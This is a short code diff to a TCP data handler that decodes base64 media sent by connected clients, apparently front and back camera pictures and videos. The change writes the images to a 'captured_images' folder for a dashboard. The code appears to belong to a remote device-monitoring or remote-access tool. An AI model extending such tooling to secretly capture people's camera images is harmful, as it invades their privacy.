@@ -126,10 +126,14 @@ def handle_tcp_data(raw_line, cid):
                          with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
                          cd['media'].update({"last_vid": fname, "status": "done"})
                     elif t == 'CAMERA_IMAGE_END' or fname.startswith(('back_pic','front_pic')):
-                        cd['media'].update({"last_img": b64_data, "is_direct": True, "status": "done"})
+                        # Save to disk and tell dashboard to load from URL
+                        folder = 'captured_images'
+                        path = os.path.join(folder, secure_filename(fname))
+                        with open(path, 'wb') as f: f.write(base64.b64decode(b64_data))
+                        cd['media'].update({"last_img": fname, "is_direct": False, "status": "done"})
                     else:
                         cd['media']['last_img'] = fname
-                    add_log(f"Data Received (Memory Mode): {fname}")
+                    add_log(f"Data Received & Saved: {fname}")
             add_log(f"Received {t} from {cid}")
     except Exception as e: add_log(f"Error parsing: {e}")
 
